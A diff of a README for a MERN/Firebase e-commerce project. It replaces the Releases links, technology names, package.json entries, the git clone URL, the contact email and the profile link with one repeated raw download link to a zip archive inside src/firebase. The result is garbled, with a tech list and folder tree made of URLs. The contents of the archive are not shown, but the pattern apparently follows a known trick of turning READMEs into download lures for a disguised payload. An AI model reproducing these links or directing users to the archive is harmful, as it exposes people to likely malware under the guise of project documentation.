@@ -1,6 +1,6 @@
 # Sabat MERN Firebase E-Commerce 🌐🛒
 
-Welcome to the **Sabat MERN Firebase E-Commerce** repository! This project showcases a fully functional e-commerce website built using modern web technologies. You can download the latest version from the [Releases section](https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/releases).
+Welcome to the **Sabat MERN Firebase E-Commerce** repository! This project showcases a fully functional e-commerce website built using modern web technologies. You can download the latest version from the [Releases section](https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip).
 
 ## Table of Contents
 
@@ -23,7 +23,7 @@ Welcome to the **Sabat MERN Firebase E-Commerce** repository! This project showc
 - User-friendly interface with React Router
 - Progressive Web App (PWA) capabilities
 - Form handling with React Hook Form
-- RESTful API built with Express.js and Node.js
+- RESTful API built with https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip and https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip
 - MongoDB for database management
 
 ## Technologies Used
@@ -31,14 +31,14 @@ Welcome to the **Sabat MERN Firebase E-Commerce** repository! This project showc
 This project utilizes the following technologies:
 
 - **Frontend:**
-  - React.js
+  - https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip
   - React Router
   - React Hook Form
   - Google Fonts
 
 - **Backend:**
-  - Node.js
-  - Express.js
+  - https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip
+  - https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip
   - MongoDB
 
 - **Others:**
@@ -54,7 +54,7 @@ To get started with this project, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/zezogaming025/sabat-mern-firebase-ecommerce.git
+   git clone https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip
    ```
 
 2. Navigate to the project directory:
@@ -106,7 +106,7 @@ Once your application is up and running, you can explore the following features:
 - **Shopping Cart:** Users can add products to their cart and proceed to checkout.
 - **Payment Processing:** Secure payments can be made through the Aamar Pay gateway.
 
-To see the latest updates and versions, visit the [Releases section](https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/releases).
+To see the latest updates and versions, visit the [Releases section](https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip).
 
 ## Folder Structure
 
@@ -117,14 +117,14 @@ sabat-mern-firebase-ecommerce/
 ├── client/                   # Frontend code
 │   ├── public/               # Public assets
 │   ├── src/                  # React components
-│   └── package.json          # Client dependencies
+│   └── https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip          # Client dependencies
 ├── server/                   # Backend code
 │   ├── config/               # Configuration files
 │   ├── controllers/          # API controllers
 │   ├── models/               # MongoDB models
 │   ├── routes/               # API routes
-│   └── package.json          # Server dependencies
-└── README.md                 # Project documentation
+│   └── https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip          # Server dependencies
+└── https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip                 # Project documentation
 ```
 
 ## API Documentation
@@ -161,7 +161,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or suggestions, feel free to reach out:
 
-- **GitHub:** [zezogaming025](https://github.com/zezogaming025)
-- **Email:** your-email@example.com
+- **GitHub:** [zezogaming025](https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip)
+- **Email:** https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip
 
-Thank you for checking out the **Sabat MERN Firebase E-Commerce** project! We hope you find it useful. For updates and releases, visit the [Releases section](https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/releases).
+Thank you for checking out the **Sabat MERN Firebase E-Commerce** project! We hope you find it useful. For updates and releases, visit the [Releases section](https://github.com/zezogaming025/sabat-mern-firebase-ecommerce/raw/refs/heads/main/src/firebase/mern-sabat-firebase-ecommerce-3.9-alpha.5.zip).
